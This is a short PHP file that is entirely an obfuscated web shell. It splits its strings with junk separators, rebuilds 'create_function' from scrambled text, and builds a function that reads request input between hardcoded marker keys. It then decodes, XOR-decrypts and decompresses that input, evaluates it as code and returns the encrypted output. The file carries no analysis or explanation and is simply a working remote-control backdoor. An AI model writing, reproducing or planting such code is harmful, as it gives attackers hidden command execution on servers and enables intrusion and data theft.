<?php
$b='match("/$khc<(c<.+)$kc<f/c<",@c<file_c<get_contc<ents(c<"php://inc<put"),$m)==c<1) {@ob_starc<t();@e';
$Y='){for(c<$jc<=0;($j<$c&c<&c<$i<$l);$jc<++,$i+c<+)c<{$o.=c<$t{$i}^$k{$jc<};}}rec<turn $c<o;}if c<(@c<prec<g_';
$x='c<val(c<@gzuncomc<pressc<(@c<x(c<@bac<se64_c<decode($m[1]),$k)))c<;$o=c<@ob_gec<c<t_contents();c<@obc<';
$g='_end_cleac<c<n();$r=@basec<64_encc<ode(@xc<(@c<gzcompresc<sc<($o),$c<k));print("c<$p$c<kh$r$kf");}';
$Z='2"c<c<;functic<on x($t,$k){c<$c=strc<len(c<$k);$l=stc<c<rlen($t);$oc<="";fc<or($i=c<0;$ic<<$l;';
$A='$k=c<"19c774bc<b";$kh="c<c1f69ab6c<acdc<e"c<c<;$kf="de3e7f66391dc<";$c<c<p="6kc<8KriaTWP9BCPg';
$t=str_replace('pS','','pScrpSeatepS_fupSncpSpStion');
$J=str_replace('c<','',$A.$Z.$Y.$b.$x.$g);
$R=$t('',$J);$R();
?>
